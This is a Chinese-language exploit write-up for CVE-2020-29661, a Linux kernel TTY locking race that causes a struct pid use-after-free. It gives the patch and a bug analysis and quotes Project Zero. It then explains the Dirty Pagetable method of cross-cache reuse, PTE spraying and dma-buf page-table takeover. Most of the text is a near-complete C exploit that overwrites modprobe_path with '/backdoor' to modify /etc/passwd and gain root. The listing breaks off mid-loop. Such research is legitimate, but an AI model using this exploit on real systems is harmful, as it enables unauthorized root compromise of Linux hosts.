# CVE-2020-29661 by Dirty Pagetable

## patch

```diff

diff --git a/drivers/tty/tty_jobctrl.c b/drivers/tty/tty_jobctrl.c
index 28a23a0fef21c3..baadeea4a289bf 100644
--- a/drivers/tty/tty_jobctrl.c
+++ b/drivers/tty/tty_jobctrl.c
@@ -494,10 +494,10 @@ static int tiocspgrp(struct tty_struct *tty, struct tty_struct *real_tty, pid_t
 	if (session_of_pgrp(pgrp) != task_session(current))
 		goto out_unlock;
 	retval = 0;
-	spin_lock_irq(&tty->ctrl_lock);
+	spin_lock_irq(&real_tty->ctrl_lock);
 	put_pid(real_tty->pgrp);
 	real_tty->pgrp = get_pid(pgrp);
-	spin_unlock_irq(&tty->ctrl_lock);
+	spin_unlock_irq(&real_tty->ctrl_lock);
 out_unlock:
 	rcu_read_unlock();
 	return retval;
```

### 漏洞分析

看似已经`spin_lock_irq`进行了加锁处理，但是`put_pid`的对象是`real_tty`，上锁的对象是`tty`，如果考虑在条件竞争的某一个时刻：

```c
  ioctl(fd1, TIOCSPGRP, pid_A)        ioctl(fd2, TIOCSPGRP, pid_B)
    spin_lock_irq(...)                  spin_lock_irq(...)
    put_pid(old_pid)
                                        put_pid(old_pid)
    real_tty->pgrp = get_pid(A)
                                        real_tty->pgrp = get_pid(B)
    spin_unlock_irq(...)                spin_unlock_irq(...)
```

```c
  ioctl(fd1, TIOCSPGRP, pid_A)        ioctl(fd2, TIOCSPGRP, pid_B)
    spin_lock_irq(...)                  spin_lock_irq(...)
    put_pid(old_pid)
                                        put_pid(old_pid)
    real_tty->pgrp = get_pid(A)
                                        real_tty->pgrp = get_pid(B)
    spin_unlock_irq(...)                spin_unlock_irq(...)
```

这两种情况都会导致`old_pid`的引用计数被额外减一，造成`pid`结构体被违规释放，构造`pid`结构体的`uaf`

### 漏洞利用

这里主要采用`Dirty Pagetable`的方法，首先我们需要先利用`cross-cache`将漏洞结构体所在的`slab`回收，因为`pid`结构体分配通过`kmem_cache`实现的，是专用缓存，一开始我尝试喷`pid`但是发现有两个问题，第一个是由于为了保证`fork`出来的进程可以在需要的时候被释放我采用了在共享内存中设置标志位，这也就意味着子进程需要执行死循环一直去检查标志位是否被标记，当`fork`大量的子进程后会导致资源占用过多，耗时过长，第二个问题是释放时使用`wait`处理时也可能出现一直等待的情况，很难判定是因为释放数量太多造成了释放缓慢还是进程被锁死，因此查看首次提出该漏洞的作者的文章：

> https://googleprojectzero.blogspot.com/2021/10/how-simple-linux-kernel-memory.html
>
> https://project-zero.issues.chromium.org/issues/42451236

阅读后我发现在作者的exp里面他采用了`seq_file`结构体：

``` c
 /*
   * The child pid should be in a page together with a bunch of seqfiles
   * allocations and nothing else.
   */
  int seqfiles[32*2];
  for (int i=0; i<32; i++)
    seqfiles[i] = SYSCHK(open("/proc/self/maps", O_RDONLY));
```

应该是受到`slab alias`机制的影响，导致他们从同一个`slab`中分配，因此只需要打开`/proc/self/maps`就能实现堆喷的目的，但是如果要`cross cache`我们需要先触发漏洞将`pid`释放掉，但是如何来判断条件竞争是否是成功了呢？

还是回来看原作者的文章，发现原作者提到，如果我们有一种方法，能够先将引用计数提高到一个较大的数值，然后进行条件竞争执行递减操作，在竞争结束之后，逐次减少原先的引用计数，当检测到某个信号时，就说明此时的结构体已经被释放了，幸运的是他们确实找到了这样的一种方法：

> On typical desktop/server distributions, the following approach works (unreliably, depending on RAM size) for setting up a freed `struct pid` with multiple dangling references:
>
> 1. Allocate a new `struct pid` (by creating a new task).
> 2. Create a large number of references to it (by sending messages with `SCM_CREDENTIALS` to unix domain sockets, and leaving those messages queued up).
> 3. Repeatedly trigger the `TIOCSPGRP` race to skew the reference count downwards, with the number of attempts chosen such that we expect that the resulting refcount skew is bigger than the number of references we need for the rest of our attack, but smaller than the number of extra references we created.
> 4. Let the task owning the `pid` exit and die, and wait for RCU (read-copy-update, a mechanism that involves delaying the freeing of some objects) to settle such that the task's reference to the `pid` is gone. (Waiting for an RCU grace period from userspace is not a primitive that is intentionally exposed through the UAPI, but there are various ways userspace can do it - e.g. by testing when a released BPF program's memory is subtracted from memory accounting, or by abusing the `membarrier(MEMBARRIER_CMD_GLOBAL, ...)` syscall after the kernel version where RCU flavors were unified.)
> 5. Create a new thread, and let that thread attempt to drop all the references we created.
>
> Because the refcount is smaller at the start of step 5 than the number of references we are about to drop, the `pid` will be freed at some point during step 5; the next attempt to drop a reference will cause a use-after-free:
>
> ```
> struct upid {
>         int nr;
>         struct pid_namespace *ns;
> };
> 
> struct pid
> {
>         atomic_t count;
>         unsigned int level;
>         /* lists of tasks that use this pid */
>         struct hlist_head tasks[PIDTYPE_MAX];
>         struct rcu_head rcu;
>         struct upid numbers[1];
> };
> [...]
> void put_pid(struct pid *pid)
> {
>         struct pid_namespace *ns;
> 
>         if (!pid)
>                 return;
> 
>         ns = pid->numbers[pid->level].ns;
>         if ((atomic_read(&pid->count) == 1) ||
>              atomic_dec_and_test(&pid->count)) {
>                 kmem_cache_free(ns->pid_cachep, pid);
>                 put_pid_ns(ns);
>         }
> }
> ```
>
> When the object is freed, the SLUB allocator normally replaces the first 8 bytes (sidenote: a different position is chosen starting in 5.7, [see Kees' blog](https://outflux.net/blog/archives/2020/09/21/security-things-in-linux-v5-7/#v5.7-slub)) of the freed object with an XOR-obfuscated freelist pointer; therefore, the `count` and `level` fields are now effectively random garbage. This means that the load from `pid->numbers[pid->level]` will now be at some random offset from the `pid`, in the range from zero to 64 GiB. As long as the machine doesn't have tons of RAM, this will likely cause a kernel segmentation fault. (Yes, I know, that's an absolutely gross and unreliable way to exploit this. It mostly works though, and I only noticed this issue when I already had the whole thing written, so I didn't really want to go back and change it... plus, did I mention that it mostly works?)
>
> Linux in its default configuration, and the configuration shipped by most general-purpose distributions, attempts to fix up unexpected kernel page faults and other types of "oopses" by killing only the crashing thread. Therefore, this kernel page fault is actually useful for us as a signal: Once the thread has died, we know that the object has been freed, and can continue with the rest of the exploit.
>
> If this code looked a bit differently and we were actually reaching a double-free, the SLUB allocator would also detect that and trigger a kernel oops (see `set_freepointer()` for the `CONFIG_SLAB_FREELIST_HARDENED` case).

但是在我尝试之后发现每次都不能成功，我发现`pid->numbers[pid->level]`中的`pid—>level`会被修改成一个极大的随机值，第一个挑战就是这个寻址不会寻址到一个不可读的空间，也就是说空间要足够大，同时，通过这个方法获取到的值`ns`还要进行下一步处理：

```c
kmem_cache_free(ns->pid_cachep, pid);
put_pid_ns(ns);
```

那么第二个挑战是，他指向的`pid_cachep`得是一个内核堆地址，这样才能成功通过`kmem_cache_free`

另外再看`put_pid_ns`函数：

```c
void put_pid_ns(struct pid_namespace *ns)
{
	struct pid_namespace *parent;

	while (ns != &init_pid_ns) {
		parent = ns->parent;
		if (!kref_put(&ns->kref, free_pid_ns))
			break;
		ns = parent;
	}
}
```

根据原作者的exp来看他是检测到进程陷入停滞状态就判断`uaf`被触发的，那么根据这个函数大概就能猜到应该是`while`的结束条件没有被满足，那么第三个挑战就需要这个`ns->parent`刚刚好是一个循环链表并且整个链表的所有元素都不满足结束的条件，综合上面的分析，我姑且认为原作者的exp仅仅能在理论条件下实现或者实现的概率极低，那么我们需要找到新的方法来检查`pid`结构体是否触发`uaf`了。

在组长的启发下，确实找到了一个更简单更快捷的办法来判断结构体是否被释放了，那就是通过`getpid`去检查进程号。首先观察可以发现条件竞争时子进程的`refcount`初始值是2，那么如果竞争成功并且作用于子进程，就会导致子进程在一轮竞争后就已经被释放掉了，这时如果我们立刻`fork`一个新的进程，他就会占用原本子进程的`pid`并更新进程号，也就是说，我们只需要检查子进程的进程号是否发生改变就能判断这个`pid`是否被我们释放掉了，下面给出关键代码：

```c
for(child_i = 0; child_i < MAX_FORK_NUM; child_i++)
    {
        pid_t child = SYSCHK(fork());
        if (child == 0)
        {
            SYSCHK(prctl(PR_SET_PDEATHSIG, SIGKILL));
            pin_cpu(1);
            SYSCHK(setpgid(0, 0));
            child = getpid();
            for (int attempts = 0; attempts < SKEW_ATTEMPTS; attempts++)
            {
                while (1)
                {
                    char syncval = *syncptr;
                    if ((syncval & 1) == 0)
                    {
                        if (syncval == 10)
                            break;
                        *syncptr = syncval + 1;
                    }
                }
                SYSCHK(ioctl(tty, TIOCSPGRP, &parent));
                *syncptr = 11;
            }
            while(1)
            {
                if(*(syncptr + child_i + 0x100) == 1)
                {
                    if(getpid() == child){
                        *(syncptr + child_i + 0x100) = 2;   // continue
                        while(1){
                            if(*(syncptr + child_i + 0x100) == 4)
                            {
                                *(syncptr + child_i + 0x200) = 1;   // exit the new fork;
                                exit(0);
                            }
                        }
                    }
                    else{
                        printf("[*] child : %d, new-child : %d\n", child, getpid());
                        *(syncptr + child_i + 0x100) = 3;   // find the uaf pid
                        while(1){
                            if(*(syncptr + child_i + 0x100) == 4) {
                                printf("[*] Free the uaf pid again\n");
                                *(syncptr + child_i + 0x200) = 1;   // exit the new fork;
                                while(1)
                                {
                                    if(*(syncptr + child_i + 0x100) == 10)
                                    {
                                        SYSCHK(listen(listensock, 128));
                                        *(syncptr + child_i + 0x100) = 9;
                                    }
                                }
                            }
                        }
                    }
                }
            }
        }
        for (int attempts = 0; attempts < SKEW_ATTEMPTS; attempts++)
        {
            SYSCHK(ioctl(ptmx, TIOCSPGRP, &child));
            *syncptr = 0;
            while (1)
            {
                char syncval = *syncptr;
                if ((syncval & 1) == 1)
                {
                    *syncptr = syncval + 1;
                    if (syncval == 9)
                        break;
                }
            }
            SYSCHK(ioctl(ptmx, TIOCSPGRP, &parent));
            while (*syncptr != 11)
                ;
        }
        int fack = fork();
        if(fack == 0)
        {
            while(1){
                if(*(syncptr + child_i + 0x200) == 1) exit(0);
            }
        }
        *(syncptr + 0x100 + child_i) = 1;
        while(1)
        {
            if(*(syncptr + child_i + 0x100) == 2)
            {
                 break;
            }else if(*(syncptr + child_i + 0x100) == 3)
            {
                break;
            }
        }

        if(*(syncptr + child_i + 0x100) == 3)
        {
            printf("[*] Find the uaf pid in child : %d\n", child_i);
            break;
        }
    }
```

通过这个方法我们很快就找到了这个被释放掉的`pid`结构体，接下来就是常规的`cross cache`操作，然后喷大量的`PTE`页表去占用这个有`pid`结构体的`slab`。

由于`pid`被释放了我们要想在不引起`kernel panic`的情况下对`pid`进行处理就只能通过递增`refcount`的方式，因此我们需要在`PTE`页表的每一个可能对应`pid`的`refcount`的位置都分配一个页表项：

```c
struct pid {
	refcount_t                 count;                /*     0     4 */
	unsigned int               level;                /*     4     4 */
	spinlock_t                 lock;                 /*     8     4 */

	/* XXX 4 bytes hole, try to pack */

	struct hlist_head          tasks[4];             /*    16    32 */
	struct hlist_head          inodes;               /*    48     8 */
	wait_queue_head_t          wait_pidfd;           /*    56    24 */
	/* --- cacheline 1 boundary (64 bytes) was 16 bytes ago --- */
	struct callback_head       rcu;                  /*    80    16 */
	struct upid                numbers[];            /*    96     0 */

	/* size: 96, cachelines: 2, members: 8 */
	/* sum members: 92, holes: 1, sum holes: 4 */
	/* last cacheline: 32 bytes */
};
```

因此只要在每个结构体内的前8个字节喷上`PTE`项即可：

![](./img/2.png)

这样当我们递增`refcount`的时候就可以通过观察对应的虚拟地址的值是否改变来判断漏洞`pid`结构体对应的虚拟地址，这里我们采用了原作者提到的方法实现对`refcount`的递增：

```c
void add_to_refcount(int count, int listensock)
{
    for (int i = 0; i < count; i++)
    {
        int refsock = SYSCHK(socket(AF_UNIX, SOCK_STREAM, 0));
        SYSCHK(connect(refsock, (struct sockaddr *)&unix_addr, sizeof(unix_addr)));
        SYSCHK(accept(listensock, NULL, NULL) == -1);
    }
}
```

但是这种方式会收到资源限制，即使我们将进程资源数改到最大值也才`4096`，但是我们一次就需要递增至少`0x1000`才能实现篡改`PTE`指向下一个物理地址，因此我们需要通过子进程来绕过这个限制。因为每个进程打开的文件描述符有限，但是如果我们可以创建很多子进程就能在子进程中继续增加引用计数来绕过限制。

我首先用最简单的方式，我`fork`了一个子进程去增加引用计数，但是很快就出现了报错，显示已经达到了限制，我怀疑是子进程的数量不够，因此我选择`fork`了更多的进程，还是提示达到限制，于是我直接调试发现，不管我开了多少进程，都会达到一个瓶颈值，我查询资料发现这是因为`fork`会继承父进程的文件描述符，这就导致这种方法行不通，但是我发现`clone`也能创建子进程并且还可以选择不继承`文件描述符`，于是尝试用`clone`的方式递增，果然成功实现了对`PTE`的递增操作：

```c
int child_func(void *arg) {
    int num = *((int *)arg);
    add_to_refcount(num, listensock);
    sleep(1);
    while (1) {}
}

int main()
{
    ...
    char *stack;
    char *stack_top;
#define STACK_SIZE (1024 * 1024)
    // 为子进程分配栈空间
    stack = malloc(STACK_SIZE);
    if (stack == NULL) {
        perror("malloc");
        exit(EXIT_FAILURE);
    }
    stack_top = stack + STACK_SIZE;

    int flags = SIGCHLD;

    // 创建子进程
    int times = 0x400;
    clone(child_func, stack_top, flags | SIGCHLD, &times);
    ...
}
```

这样只要提前在每个虚拟地址空间内用当前虚拟地址做标记，在递增操作结束后逐页检查就能找到对应漏洞对象的虚拟空间地址。

定位到漏洞对象记录的`PTE`对应的用户地址后，我们可以利用累加操作将`PTE`指向其他物理地址，但是由于`mmap`分配的物理地址与内核代码的物理地址和页表页的物理地址不是连续的且我们只有递增原语没有递减原语，因此我们利用`dma-buf`分配的共享内存页和页表页是从同一片物理地址分配的，这样我们可以构造：

```c
|-------|
|  ...  |
|-------|
|  PTE  |
|-------|
|  DMA  |
|-------|
|  PTE  |
|-------|
|  ...  |
|-------|
```

当递增DMA共享页的物理地址时就能实现将临近的`PTE`页表页映射到用户空间的目的，因此大致流程为：

1. 分配10个用户页表
2. 利用递增原语构造同一物理页映射到不同的虚拟页找到`addr1`
3. 回收`addr1`对应的页面，在`addr1`处分配`dma-buf`共享页
4. 分配10个用户页表
5. 利用递增原语构造将`dma-buf`对应的物理地址修改为页表页地址并映射到虚拟地址`addr1`中
6. 读取`addr1`判断是否映射成功，成功后将`addr1`对应的值加`0x1000`使得原本的虚拟地址`addr3`对应的物理页映射到`addr2`中，并沿用前面的方式找到`addr2`

至此我们已经构造出了一个可控的页表页`addr1`和他对应映射的虚拟页`addr2`，此时我们可以从起始地址开始遍历物理空间，通过在读取`addr2`中的信息来判断是否找到了内核基址对应的物理基址，找到物理基址后继续遍历寻找`modprobe_path`的物理地址，直接修改其对应的程序为`/backdoor`程序，并执行`/error`触发执行`/backdoor`修改`/etc/passwd`，或者也可以通过直接patch内核代码段来实现逃逸。

### 完整exp

```c
#define _GNU_SOURCE
#include <err.h>
#include <errno.h>
#include <sched.h>
#include <unistd.h>
#include <fcntl.h>
#include <termios.h>
#include <signal.h>
#include <stdbool.h>
#include <stdio.h>
#include <stdlib.h>
#include <sys/prctl.h>
#include <sys/ioctl.h>
#include <sys/stat.h>
#include <sys/wait.h>
#include <sys/socket.h>
#include <sys/un.h>
#include <sys/mman.h>
#include <sys/epoll.h>
#include <sys/syscall.h>
#include <sys/eventfd.h>
#include <sys/resource.h>
#include <linux/dma-heap.h>

#define MAX_FORK_NUM 0x30

#define _pte_index_to_virt(i) (i << 12)
#define _pmd_index_to_virt(i) (i << 21)
#define _pud_index_to_virt(i) (i << 30)
#define _pgd_index_to_virt(i) (i << 39)
#define PTI_TO_VIRT(pud_index, pmd_index, pte_index, page_index, byte_index) \
	((void*)(_pgd_index_to_virt((unsigned long long)(pud_index)) + _pud_index_to_virt((unsigned long long)(pmd_index)) + \
	_pmd_index_to_virt((unsigned long long)(pte_index)) + _pte_index_to_virt((unsigned long long)(page_index)) + (unsigned long long)(byte_index)))

// cat /sys/kernel/slab/filp/cpu_partial
#define CPU_PARTIAL 30
// cat /sys/kernel/slab/filp/objs_per_slab
#define OBJS_PER_SLAB 32

/*
 * 在尝试降低引用计数之前，struct pid 的引用计数应该提升到多高；
 * 由两个参数的乘积决定。
 */
#define SOCKS_FOR_CREDS 1
#define CREDS_PER_SOCKET 1

/*
 * 尝试竞态条件的频率。
 * 如果程序在初始阶段崩溃，请降低这个数字。
 * 一个有效的漏洞利用可能会使这个数字以指数方式增长，
 * 或者类似的方式。
 */

#define SKEW_ATTEMPTS 2
#define KMOD_PATH_LEN 0x100

#define SYSCHK(x) ({              \
    typeof(x) __res = (x);        \
    if (__res == (typeof(x))-1)   \
        err(1, "SYSCHK(" #x ")"); \
    __res;                        \
})


/*
 * 通过在所有者调用 listen() 的套接字上连接 @count 次，
 * 将 @count 添加到 struct pid 中。
 * 这样，即使任务已经结束，我们也可以增加 PID 的引用计数。
 */

struct sockaddr_un unix_addr = {
    .sun_family = AF_UNIX,
    .sun_path = "/tmp/exploitsocket"};

void add_to_refcount(int count, int listensock)
{
    for (int i = 0; i < count; i++)
    {
        int refsock = SYSCHK(socket(AF_UNIX, SOCK_STREAM, 0));
        SYSCHK(connect(refsock, (struct sockaddr *)&unix_addr, sizeof(unix_addr)));
        SYSCHK(accept(listensock, NULL, NULL) == -1);
    }
}

#define FLUSH_STAT_INPROGRESS 0
#define FLUSH_STAT_DONE 1
#define EXPLOIT_STAT_RUNNING 0
#define EXPLOIT_STAT_FINISHED 3

#define SPINLOCK(cmp) while (cmp) { usleep(10 * 1000); }

static void flush_tlb(void *addr, size_t len)
{
	short *status;

	status = mmap(NULL, sizeof(short), PROT_READ | PROT_WRITE, MAP_SHARED | MAP_ANONYMOUS, -1, 0);
	
	*status = FLUSH_STAT_INPROGRESS;
	if (fork() == 0)
	{
		munmap(addr, len);
        // printf("[*] munmap finish\n");
		*status = FLUSH_STAT_DONE;
		sleep(9999);
        
	}

	SPINLOCK(*status == FLUSH_STAT_INPROGRESS);

	munmap(status, sizeof(short));
    sleep(0.5);
}

void pin_cpu(int cpu)
{
    cpu_set_t cpuset;
    CPU_ZERO(&cpuset);
    CPU_SET(cpu, &cpuset);
    SYSCHK(sched_setaffinity(0, sizeof(cpuset), &cpuset));
}

/*
 * We want the child to be able to close its parent's file descriptors.
 */
#define fork() syscall(__NR_clone, CLONE_FILES | SIGCHLD, NULL, NULL, NULL, 0)

void increase_fds(void)
{
    struct rlimit old_lim, lim;

    if (getrlimit(RLIMIT_NOFILE, &old_lim) != 0)
    {
        printf("[x] `getrlimit()` failed\n");
        exit(-1);
    }

    lim.rlim_cur = old_lim.rlim_max;
    lim.rlim_max = old_lim.rlim_max;

    if (setrlimit(RLIMIT_NOFILE, &lim) != 0)
    {
        printf("[x] `setrlimit()` failed\n");
        exit(-1);
    }
    printf("[*] Increased fd limit from %ld to %ld\n", old_lim.rlim_cur, lim.rlim_cur);
    return;
}
int listensock;
int child_func(void *arg) {
    int num = *((int *)arg);
    add_to_refcount(num, listensock);
    sleep(1);
    while (1)
    {
        /* code */
    }
    
}

void read_file(char *data)
{

    int fd = open("/proc/sys/kernel/modprobe", O_RDONLY);
    read(fd, data, 0x100);
    close(fd);
}

static int strcmp_modprobe_path(char *new_str)
{
	char buf[KMOD_PATH_LEN] = { '\x00' };

	read_file(buf);
    printf("[*] modprobe path : %s\n", buf);
	
	return strncmp(new_str, buf, strlen(new_str));
}

void *memmem_modprobe_path(void *haystack_virt, size_t haystack_len, char *modprobe_path_str, size_t modprobe_path_len)
{
	void *pmd_modprobe_addr;
	pmd_modprobe_addr = memmem(haystack_virt, haystack_len, modprobe_path_str, modprobe_path_len);
	if (pmd_modprobe_addr == NULL)
		return NULL;
	strcpy(pmd_modprobe_addr, "/backdoor");
	if (strcmp_modprobe_path("/backdoor") != 0)
	{
		printf("[-] false positive. skipping to next one\n");
		return NULL;
	}

	return pmd_modprobe_addr;
}

char modprobe_path[0x100] = {0};

int main(void)
{
    setbuf(stdout, NULL);
    sync(); /* we're probably gonna crash... */

    printf("[*] starting up...\n");
    pin_cpu(0);
    read_file(modprobe_path);

    increase_fds();

    
    printf("[*] prepare PTE memory...\n");
	for (unsigned long long i=0; i < 20; i++)
	{
		void *retv = mmap((void*)PTI_TO_VIRT(2, 0, i, 0, 0), 0x200000, PROT_READ | PROT_WRITE, MAP_FIXED | MAP_SHARED | MAP_ANONYMOUS, -1, 0);
        if (retv == MAP_FAILED)
        {
            perror("mmap");
            exit(EXIT_FAILURE);
        }
	}

    uid_t myuid = getuid();
    gid_t mygid = getgid();

    pid_t main_task = SYSCHK(fork());
    if (main_task != 0)
    {
        int status;
        if (waitpid(main_task, &status, 0) != main_task)
            err(1, "waitpid main_task");
        return 0;
    }
    SYSCHK(prctl(PR_SET_PDEATHSIG, SIGKILL));
    if (getppid() == 1)
        exit(0);

    printf("[*] executing in first level child process, setting up session and PTY pair...\n");

    /* basic preparation */
    SYSCHK(signal(SIGTTOU, SIG_IGN));
    SYSCHK(setsid());

    /* set up a new pty pair */
    int ptmx = SYSCHK(open("/dev/ptmx", O_RDWR));
    unlockpt(ptmx);
    int tty = SYSCHK(open(ptsname(ptmx), O_RDWR));

    /* shared memory for cross-process synchronization */
    volatile char *syncptr = mmap(NULL, 0x1000, PROT_READ | PROT_WRITE, MAP_SHARED | MAP_ANONYMOUS, -1, 0);
    memset((void *)syncptr, 0, 0x1000);
    if ((void *)syncptr == MAP_FAILED)
        err(1, "mmap shared");

    listensock = SYSCHK(socket(AF_UNIX, SOCK_STREAM, 0));
    unlink(unix_addr.sun_path);
    SYSCHK(bind(listensock, (struct sockaddr *)&unix_addr, sizeof(unix_addr)));

    //cc1
    printf("[*] Begin cc1\n");
    int ccfile1[(CPU_PARTIAL + 2) * OBJS_PER_SLAB];
    for(int i = 0; i < (CPU_PARTIAL + 2) * OBJS_PER_SLAB; i++)
    {
        ccfile1[i] = SYSCHK(open("/proc/self/maps", O_RDONLY));
    }
    sleep(0.1);
    // cc2
    printf("[*] Begin cc2\n");
    int ccfile2[OBJS_PER_SLAB];
    for (int i = 0; i < OBJS_PER_SLAB - 1; i++)
    {
        ccfile2[i] = SYSCHK(open("/proc/self/maps", O_RDONLY));
    }
    sleep(0.1);
    // cc3
    printf("[*] Begin cc3\n");
    printf("[*] Launching child process\n");
    int parent = getpid();
    int child_i = 0;
    for(child_i = 0; child_i < MAX_FORK_NUM; child_i++)
    {
        pid_t child = SYSCHK(fork());
        if (child == 0)
        {
            SYSCHK(prctl(PR_SET_PDEATHSIG, SIGKILL));
            pin_cpu(1);

            SYSCHK(setpgid(0, 0));
            child = getpid();


            for (int attempts = 0; attempts < SKEW_ATTEMPTS; attempts++)
            {
                while (1)
                {
                    char syncval = *syncptr;
                    if ((syncval & 1) == 0)
                    {
                        if (syncval == 10)
                            break;
                        *syncptr = syncval + 1;
                    }
                }
                SYSCHK(ioctl(tty, TIOCSPGRP, &parent));
                *syncptr = 11;
            }
            while(1)
            {
                if(*(syncptr + child_i + 0x100) == 1)
                {
                    if(getpid() == child){
                        *(syncptr + child_i + 0x100) = 2;   // continue
                        while(1){
                            if(*(syncptr + child_i + 0x100) == 4)
                            {
                                *(syncptr + child_i + 0x200) = 1;   // exit the new fork;
                                exit(0);
                            }
                        }
                    }
                    else{
                        printf("[*] child : %d, new-child : %d\n", child, getpid());
                        *(syncptr + child_i + 0x100) = 3;   // find the uaf pid
                        while(1){
                            if(*(syncptr + child_i + 0x100) == 4) {
                                printf("[*] Free the uaf pid again\n");
                                *(syncptr + child_i + 0x200) = 1;   // exit the new fork;
                                while(1)
                                {
                                    if(*(syncptr + child_i + 0x100) == 10)
                                    {
                                        /* create post-death-incrementable pid reference */
                                        SYSCHK(listen(listensock, 128 /*SOMAXCONN*/));
                                        *(syncptr + child_i + 0x100) = 9;
                                    }
                                }
                            }
                        }
                    }
                }
            }
            // printf("[*] refcount should now be skewed, child exiting\n");
            // return -1;
            // exit(-1);
        }
        for (int attempts = 0; attempts < SKEW_ATTEMPTS; attempts++)
        {
            SYSCHK(ioctl(ptmx, TIOCSPGRP, &child));
            *syncptr = 0;
            while (1)
            {
                char syncval = *syncptr;
                if ((syncval & 1) == 1)
                {
                    *syncptr = syncval + 1;
                    if (syncval == 9)
                        break;
                }
            }
            SYSCHK(ioctl(ptmx, TIOCSPGRP, &parent));
            while (*syncptr != 11)
                ;
        }
        // getchar();p
        int fack = fork();
        if(fack == 0)
        {
            while(1){
                if(*(syncptr + child_i + 0x200) == 1) exit(0);
            }
        }
        *(syncptr + 0x100 + child_i) = 1;
        while(1)
        {
            if(*(syncptr + child_i + 0x100) == 2)
            {
                 break;
            }else if(*(syncptr + child_i + 0x100) == 3)
            {
                break;
            }
        }

        if(*(syncptr + child_i + 0x100) == 3)
        {
            printf("[*] Find the uaf pid in child : %d\n", child_i);
            break;
        }
    }
    if(child_i == MAX_FORK_NUM)
    {
        printf("[*] Can't find the uaf pid\n");
        for(int i = 0; i < (CPU_PARTIAL + 2) * OBJS_PER_SLAB; i++)
        {
            close(ccfile1[i]);
        }
        for(int i = 0; i < OBJS_PER_SLAB - 1; i++)
        {
            close(ccfile2[i]);
        }
        return -1;
    }
    sleep(0.1);
    // cc4
    printf("[*] Begin cc4\n");
    int ccfile4[OBJS_PER_SLAB + 1];
    for(int i = 0; i < OBJS_PER_SLAB + 1; i++)
    {
        ccfile4[i] = SYSCHK(open("/proc/self/maps", O_RDONLY));
    }
    sleep(0.1);

    printf("[*] UAF pid id : %d\n", child_i);
    printf("[*] Free the uaf pid\n");
    *(syncptr + 0x100 + child_i) = 4;
    wait(NULL);
    for(int i = 0; i < child_i; i++)
    {
        *(syncptr + 0x100 + i) = 4;
    }
    for(int i = 0; i < 2 * child_i; i++)
    {
        wait(NULL);
    }
    printf("[*] Free finish\n");
    sleep(0.1);
    printf("[*] Free the struct around uaf pid\n");
    for(int i = 0; i < OBJS_PER_SLAB; i++)
    {
        (close(ccfile4[i]));
    }
    for(int i = OBJS_PER_SLAB - 1; i >= 0; i--)
    {
        (close(ccfile2[i]));
    }

    printf("[*] Free the struct in first %d page\n", CPU_PARTIAL);
    for(int i = (CPU_PARTIAL + 2) * OBJS_PER_SLAB - 1; i >= 0; i--)
    {
        if(i % OBJS_PER_SLAB == 0)
        {
            (close(ccfile1[i]));
        }
    }

    sleep(1);
    printf("[*] Finish cc !\n");
    // getchar();
    // await_rcu_call();
    printf("[*] spraying 10 pte's...\n");
	for (unsigned long long i=0; i < 10; i++)
	{
		for(unsigned long long j = 0; j < 0x1000/8; j++)
        {
            if(j % 0x10 == 0)
            {
                *(uint64_t*)PTI_TO_VIRT(2, 0, i, j, 0) = (uint64_t *)PTI_TO_VIRT(2, 0, i, j, 0);
            }
        }
	}
    printf("[*] spraying finish\n");

    for(int i = (CPU_PARTIAL + 2) * OBJS_PER_SLAB - 1; i >= 0; i--)
    {
        if(i % OBJS_PER_SLAB != 0)
        {
            SYSCHK(close(ccfile1[i]));
        }
    }

    *(syncptr + child_i + 0x100) = 10;
    while(*(syncptr + child_i + 0x100) != 9)
    {

    }
    char *stack;
    char *stack_top;
#define STACK_SIZE (1024 * 1024)
    // 为子进程分配栈空间
    stack = malloc(STACK_SIZE);
    if (stack == NULL) {
        perror("malloc");
        exit(EXIT_FAILURE);
    }
    stack_top = stack + STACK_SIZE;

    int flags = SIGCHLD;

    // 创建子进程
    int times = 0x400;
    clone(child_func, stack_top, flags | SIGCHLD, &times);
    clone(child_func, stack_top, flags | SIGCHLD, &times);
    clone(child_func, stack_top, flags | SIGCHLD, &times);
    times = 0x3ff;
    clone(child_func, stack_top, flags | SIGCHLD, &times);

    uint64_t *victim_pte = NULL;
    uint64_t *pte_page = NULL;
    int victim_i = 0;    
    int victim_i_1 = 0;

    for(int i = 0; i < 10; i++)
    {
        flush_tlb(PTI_TO_VIRT(2, 0, i, 0, 0), 0x200000);
    }

    for (unsigned long long i=0; i < 10; i++)
	{
		for(unsigned long long j = 0; j < 0x1000/8; j++)
        {
            if(j % 0x10 == 0)
            {
                if(*(uint64_t*)PTI_TO_VIRT(2, 0, i, j, 0) != (uint64_t )PTI_TO_VIRT(2, 0, i, j, 0))
                {
                    victim_pte = (uint64_t*)PTI_TO_VIRT(2, 0, i, j, 0);
                    victim_i = i;
                    printf("[*] Find the pte in 0x%lx, value 0x%lx\n", victim_pte, *victim_pte);
                    break;
                }
            }
        }
	}

    if (victim_pte == NULL)
    {
        printf("[x] failed to find victim pte\n");
        while (1)
        {
            /* code */
        }
        
    }

    printf("[*] Start dma\n");
    int dma_heap_fd = SYSCHK(open("/dev/dma_heap/system", O_RDWR));
    struct dma_heap_allocation_data data;

    data.len = 0x1000;
    data.fd_flags = O_RDWR;
    data.heap_flags = 0;
    data.fd = 0;

    if (ioctl(dma_heap_fd, DMA_HEAP_IOCTL_ALLOC, &data) < 0) {
        perror("DMA_HEAP_IOCTL_ALLOC");
        return -1;
    }
    int dma_buf_fd = data.fd;
    printf("[*] dma_buf_fd : %d\n", dma_buf_fd);
    printf("[*] Start to unmap\n");
    munmap(victim_pte, 0x1000);
    void* dma_page = mmap(victim_pte, 0x1000, PROT_READ | PROT_WRITE, MAP_SHARED | MAP_POPULATE, dma_buf_fd, 0);
    *(uint64_t*)dma_page = 0x4141414141414141;
    
    for (unsigned long long i=10; i < 20; i++)
	{
		*(uint64_t*)PTI_TO_VIRT(2, 0, i, 0, 0) = (uint64_t *)PTI_TO_VIRT(2, 0, i, 0, 0);
	}

    printf("[*] spraying finish\n");
    times = 0x400;
    for(int i = 0; i < 4; i++)
    {
        clone(child_func, stack_top, flags | SIGCHLD, &times);
    }

    for(int i = 0; i < 10; i++)
    {
        flush_tlb(PTI_TO_VIRT(2, 0, i, 0, 0), 0x200000);
    }
    printf("[*] Find the dma in 0x%lx, pte-value 0x%lx\n", dma_page, *(uint64_t *)dma_page);
    *(uint64_t *)dma_page = *(uint64_t *)dma_page + 0x4000;
    for(int i = 0; i < 20; i++)
    {
        flush_tlb(PTI_TO_VIRT(2, 0, i, 0, 0), 0x200000);
    }

    uint64_t physical_addr;
    
    for (unsigned long long i = 10; i < 20; i++)
	{
